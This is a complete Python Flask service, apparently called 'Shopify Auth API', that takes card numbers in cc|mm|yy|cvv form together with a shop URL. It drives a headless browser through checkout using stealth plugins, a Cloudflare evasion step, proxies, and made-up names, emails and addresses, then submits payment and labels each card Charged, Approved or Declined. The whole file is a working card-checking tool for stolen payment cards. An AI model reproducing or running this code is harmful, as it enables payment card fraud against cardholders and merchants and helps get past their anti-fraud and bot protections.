from flask import Flask, request, jsonify
from playwright.async_api import async_playwright
import asyncio
import re
import random
import string
import os
import time
import json
from datetime import datetime
from urllib.parse import urlparse

try:
    from playwright_stealth import stealth_async
    STEALTH_AVAILABLE = True
except:
    STEALTH_AVAILABLE = False

app = Flask(__name__)

stats = {
    "total_checks": 0,
    "charged": 0,
    "approved": 0,
    "declined": 0,
    "errors": 0,
    "start_time": datetime.now().isoformat()
}

CONFIG = {
    "headless": os.environ.get('HEADLESS', 'true').lower() == 'true',
    "timeout": 30000,
    "checkout_timeout": 45000,
    "use_stealth": True,
    "retry_attempts": 2,
    "debug": os.environ.get('DEBUG', 'false').lower() == 'true'
}

def generate_random_email():
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'proton.me', 'icloud.com', 'hotmail.com']
    first_names = ['john', 'james', 'mike', 'david', 'chris', 'alex', 'sam', 'ryan', 'kevin', 'brian']
    last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'miller', 'davis', 'wilson', 'taylor']
    name = random.choice(first_names) + random.choice(['', '.', '_']) + random.choice(last_names)
    number = random.choice(['', str(random.randint(1, 999))])
    return f"{name}{number}@{random.choice(domains)}"

def generate_random_address():
    first_names = ['John', 'James', 'Robert', 'Michael', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles']
    last_names = ['Smith', 'Johnson', '205', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
    streets = ['Main St', 'Oak Ave', 'Maple Rd', 'Cedar Ln', 'Pine St', 'Elm Blvd', 'Washington Ave', 'Park Rd', 'Lake St', 'Hill Dr']
    cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin']
    states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'FL', 'OH', 'MI', 'GA']
    
    return {
        'first_name': random.choice(first_names),
        'last_name': random.choice(last_names),
        'address': f"{random.randint(100, 99999)} {random.choice(streets)}",
        'apartment': f"Apt {random.randint(1, 999)}" if random.random() > 0.7 else "",
        'city': random.choice(cities),
        'state': random.choice(states),
        'zip': f"{random.randint(10000, 99999)}",
        'phone': f"{random.randint(200, 999)}-{random.randint(200, 999)}-{random.randint(1000, 9999)}",
        'country': 'United States'
    }

async def enhanced_cf_bypass(page):
    try:
        await page.wait_for_selector('body', timeout=5000)
        await page.wait_for_timeout(random.randint(1000, 2000))
        content = await page.content()
        if 'Checking your browser' in content or 'cf-browser-verification' in content:
            await page.wait_for_timeout(random.randint(5000, 7000))
        if 'challenges.cloudflare.com' in content:
            await page.wait_for_timeout(random.randint(4000, 6000))
        await page.mouse.move(random.randint(100, 500), random.randint(100, 500))
        return True
    except:
        return True

async def find_and_add_product(page):
    product_selectors = [
        'a[href*="/products/"]', 'a[href*="/product/"]', '.product-card a',
        '.product-item a', '.grid-product__link', '.product__link'
    ]
    
    for selector in product_selectors:
        try:
            elements = await page.locator(selector).all()
            if len(elements) > 0:
                element = random.choice(elements[:5]) if len(elements) > 1 else elements[0]
                await element.click()
                await page.wait_for_load_state('domcontentloaded', timeout=10000)
                await page.wait_for_timeout(random.randint(1000, 2000))
                
                add_selectors = [
                    'button[name="add"]', 'button:has-text("Add to cart")',
                    'button:has-text("Add to bag")', '#AddToCart',
                    '[data-test="add-to-cart"]', '.product-form__cart-submit'
                ]
                
                for add_sel in add_selectors:
                    try:
                        add_btn = await page.locator(add_sel).first
                        if await add_btn.count() > 0:
                            is_disabled = await add_btn.get_attribute('disabled')
                            if not is_disabled:
                                await add_btn.click()
                                await page.wait_for_timeout(random.randint(2000, 3000))
                                return True
                    except:
                        continue
        except:
            continue
    return False

async def navigate_to_checkout(page):
    checkout_selectors = [
        'a[href*="/checkout"]', 'a[href*="checkout"]', 'button[name="checkout"]',
        'button:has-text("Checkout")', '.cart__checkout-button', '#checkout'
    ]
    
    for selector in checkout_selectors:
        try:
            element = await page.locator(selector).first
            if await element.count() > 0:
                await element.click()
                await page.wait_for_load_state('domcontentloaded', timeout=15000)
                await page.wait_for_timeout(random.randint(2000, 3000))
                return True
        except:
            continue
    
    try:
        current_url = page.url
        base_url = urlparse(current_url).netloc
        await page.goto(f"https://{base_url}/checkout", timeout=15000)
        await page.wait_for_load_state('domcontentloaded', timeout=10000)
        return True
    except:
        pass
    
    return False

async def fill_contact_info_enhanced(page, email=None):
    if not email:
        email = generate_random_email()
    
    email_selectors = [
        '#checkout_email', '#email', 'input[type="email"]',
        'input[name="email"]', '[placeholder*="Email"]'
    ]
    
    for selector in email_selectors:
        try:
            element = await page.locator(selector).first
            if await element.count() > 0:
                await element.fill(email)
                try:
                    newsletter = await page.locator('#checkout_buyer_accepts_marketing, [name*="marketing"]').first
                    if await newsletter.count() > 0:
                        await newsletter.uncheck()
                except:
                    pass
                return True
        except:
            continue
    return False

async def fill_shipping_address_enhanced(page, address):
    field_mappings = {
        'first_name': ['#checkout_shipping_address_first_name', '[name="firstName"]', '#firstName'],
        'last_name': ['#checkout_shipping_address_last_name', '[name="lastName"]', '#lastName'],
        'address': ['#checkout_shipping_address_address1', '[name="address1"]', '#address1'],
        'city': ['#checkout_shipping_address_city', '[name="city"]', '#city'],
        'zip': ['#checkout_shipping_address_zip', '[name="postalCode"]', '#postalCode'],
        'phone': ['#checkout_shipping_address_phone', '[name="phone"]', '#phone']
    }
    
    for field, selectors in field_mappings.items():
        value = address.get(field, '')
        if value:
            for selector in selectors:
                try:
                    element = await page.locator(selector).first
                    if await element.count() > 0:
                        await element.fill(str(value))
                        await page.wait_for_timeout(random.randint(100, 300))
                        break
                except:
                    continue
    
    state_selectors = ['#checkout_shipping_address_province', '[name="province"]', '#state']
    for selector in state_selectors:
        try:
            element = await page.locator(selector).first
            if await element.count() > 0:
                try:
                    await element.select_option(value=address['state'])
                except:
                    try:
                        await element.select_option(label=address['state'])
                    except:
                        options = await element.locator('option').all()
                        for opt in options:
                            value = await opt.get_attribute('value')
                            if value and value.strip():
                                await element.select_option(value=value)
                                break
                break
        except:
            continue
    
    continue_selectors = [
        'button:has-text("Continue to shipping")', 'button:has-text("Continue")',
        '#continue_button', '[data-step="contact_information"] button'
    ]
    
    for selector in continue_selectors:
        try:
            element = await page.locator(selector).first
            if await element.count() > 0:
                await element.click()
                await page.wait_for_timeout(random.randint(2000, 3000))
                return True
        except:
            continue
    return True

async def fill_card_details_enhanced(page, card_info):
    cc, mm, yy, cvv = card_info['cc'], card_info['mm'], card_info['yy'], card_info['cvv']
    await page.wait_for_timeout(random.randint(2000, 3000))
    
    card_filled = False
    card_frame_selectors = [
        'iframe[title*="card number" i]', 'iframe[title*="credit card" i]',
        'iframe[src*="card-fields"]', '.card-fields-iframe'
    ]
    
    for frame_sel in card_frame_selectors:
        try:
            frame = page.frame_locator(frame_sel).first
            if await frame.locator('[name="number"], #number, [data-card-field="number"], [placeholder*="Card number"]').first.count() > 0:
                await frame.locator('[name="number"], #number, [data-card-field="number"], [placeholder*="Card number"]').first.fill(cc)
                card_filled = True
                await page.wait_for_timeout(random.randint(300, 600))
                break
        except:
            continue
    
    if not card_filled:
        direct_selectors = ['#card-number', '[name="cardnumber"]', '#number', '[name="number"]']
        for sel in direct_selectors:
            try:
                el = await page.locator(sel).first
                if await el.count() > 0:
                    await el.fill(cc)
                    card_filled = True
                    break
            except:
                continue
    
    expiry_frame_selectors = ['iframe[title*="expiration" i]', 'iframe[title*="expiry" i]']
    for frame_sel in expiry_frame_selectors:
        try:
            frame = page.frame_locator(frame_sel).first
            if await frame.locator('[name="expiry"], #expiry, [placeholder*="MM / YY"]').first.count() > 0:
                await frame.locator('[name="expiry"], #expiry, [placeholder*="MM / YY"]').first.fill(f'{mm}/{yy}')
                await page.wait_for_timeout(random.randint(300, 600))
                break
        except:
            try:
                await page.locator('#expiry, [name="exp-date"]').first.fill(f'{mm}/{yy}')
            except:
                pass
    
    cvv_frame_selectors = ['iframe[title*="security" i]', 'iframe[title*="cvv" i]']
    for frame_sel in cvv_frame_selectors:
        try:
            frame = page.frame_locator(frame_sel).first
            if await frame.locator('[name="cvc"], #cvv, [placeholder*="CVV"]').first.count() > 0:
                await frame.locator('[name="cvc"], #cvv, [placeholder*="CVV"]').first.fill(cvv)
                await page.wait_for_timeout(random.randint(300, 600))
                break
        except:
            try:
                await page.locator('#cvv, [name="cvc"]').first.fill(cvv)
            except:
                pass
    
    return card_filled

async def extract_price_enhanced(page):
    price_selectors = [
        '.total-recap__final-price', '.payment-due__price',
        '[data-checkout-payment-due-target]', '.order-summary__emphasis',
        '.total-line__price', '.cart-total__price', '.total-price'
    ]
    
    for selector in price_selectors:
        try:
            element = await page.locator(selector).first
            price_text = await element.text_content()
            if price_text:
                match = re.search(r'\$\s*(\d+\.?\d*)', price_text)
                if match:
                    return f"${match.group(1)}"
        except:
            continue
    return "-"

async def detect_gateway(page, content, site_url):
    cl = content.lower()
    if 'shopify' in cl or 'myshopify' in site_url:
        return "Shopify Payments"
    elif 'stripe' in cl:
        return "Stripe"
    elif 'authorize' in cl:
        return "Authorize.net"
    elif 'braintree' in cl:
        return "Braintree"
    elif 'paypal' in cl:
        return "PayPal (Cards)"
    else:
        return "Unknown Gateway"

async def analyze_response(page, content, url):
    cl = content.lower()
    
    if "thank_you" in url or "thank-you" in url or "order/confirm" in url:
        return "Order completed", "Charged"
    elif "thank you" in cl or "order confirmed" in cl:
        return "Order completed", "Charged"
    elif "insufficient funds" in cl:
        return "Insufficient funds", "Approved"
    elif "incorrect cvv" in cl or "incorrect cvc" in cl:
        return "Incorrect CVV", "Approved"
    elif "incorrect zip" in cl or "postal" in cl:
        return "AVS Mismatch", "Approved"
    elif "do not honor" in cl:
        return "Do Not Honor", "Declined"
    elif "3d secure" in cl or "authentication" in cl:
        return "3D Secure Required", "3DS"
    elif "declined" in cl or "refused" in cl:
        return "Card Declined", "Declined"
    elif "stolen" in cl or "pickup" in cl:
        return "Pickup Card", "Declined"
    else:
        return "Unknown response", "Unknown"

async def ultra_checkout(card, site_url, proxy=None):
    try:
        cc, mm, yy, cvv = card.replace(' ', '').split('|')
        if len(yy) == 4:
            yy = yy[2:]
    except:
        stats["errors"] += 1
        return {"Response": "Invalid card format", "Price": "-", "Gateway": "Unknown", "Status": "Error"}
    
    if not site_url.startswith('http'):
        site_url = 'https://' + site_url
    
    result = {"Response": "", "Price": "-", "Gateway": "Unknown", "Status": "Unknown", "Time": 0}
    start_time = time.time()
    
    async with async_playwright() as p:
        args = [
            '--disable-blink-features=AutomationControlled', '--no-sandbox',
            '--disable-dev-shm-usage', '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-site-isolation-trials'
        ]
        
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy_url = f'http://{username}:{password}@{ip}:{port}'
            elif len(parts) == 2:
                proxy_url = f'http://{parts[0]}:{parts[1]}'
            elif '@' in proxy:
                proxy_url = proxy if proxy.startswith('http') else f'http://{proxy}'
            else:
                proxy_url = proxy
            args.append(f'--proxy-server={proxy_url}')
        
        browser = await p.chromium.launch(headless=True, args=args)
        context = await browser.new_context(
            viewport={'width': 1366, 'height': 768},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
            locale='en-US',
            timezone_id='America/New_York'
        )
        page = await context.new_page()
        
        if STEALTH_AVAILABLE:
            try:
                await stealth_async(page)
            except:
                pass
        
        try:
            await page.goto(site_url, timeout=30000, wait_until='domcontentloaded')
            await enhanced_cf_bypass(page)
            
            content = await page.content()
            result["Gateway"] = await detect_gateway(page, content, site_url)
            
            await find_and_add_product(page)
            await navigate_to_checkout(page)
            
            email = generate_random_email()
            await fill_contact_info_enhanced(page, email)
            
            address = generate_random_address()
            await fill_shipping_address_enhanced(page, address)
            
            await page.wait_for_timeout(random.randint(2000, 3000))
            
            continue_btn = await page.locator('button:has-text("Continue"), #continue_button, button[type="submit"]').first
            if await continue_btn.count() > 0:
                await continue_btn.click()
                await page.wait_for_timeout(random.randint(2000, 3000))
            
            result["Price"] = await extract_price_enhanced(page)
            await fill_card_details_enhanced(page, {'cc': cc, 'mm': mm, 'yy': yy, 'cvv': cvv})
            
            pay_btn = await page.locator('button:has-text("Pay now"), button:has-text("Complete"), #pay-button').first
            if await pay_btn.count() > 0:
                await pay_btn.click()
            
            await page.wait_for_timeout(random.randint(6000, 8000))
            
            content = await page.content()
            url = page.url
            
            response_text, status = await analyze_response(page, content, url)
            result["Response"] = response_text
            result["Status"] = status
            
            stats["total_checks"] += 1
            if status == "Charged":
                stats["charged"] += 1
            elif status == "Approved":
                stats["approved"] += 1
            elif status == "Declined":
                stats["declined"] += 1
                
        except Exception as e:
            stats["errors"] += 1
            result["Response"] = f"Error: {str(e)[:100]}"
            result["Status"] = "Error"
        finally:
            await browser.close()
    
    result["Time"] = round(time.time() - start_time, 2)
    return result

@app.route('/8081/', methods=['GET'])
@app.route('/', methods=['GET'])
def api_check():
    card = request.args.get('cc', '')
    url = request.args.get('url', '')
    proxy = request.args.get('proxy', '')
    
    if not card or not url:
        return jsonify({"Response": "Missing parameters", "Price": "-", "Gateway": "Error", "Status": "Error"})
    
    result = asyncio.run(ultra_checkout(card, url, proxy))
    return jsonify(result)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "alive", "service": "Shopify Auth API v3.0", "stats": stats})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8081))
    print(f"🔥 API Running on port {port}")
    app.run(host='0.0.0.0', port=port)
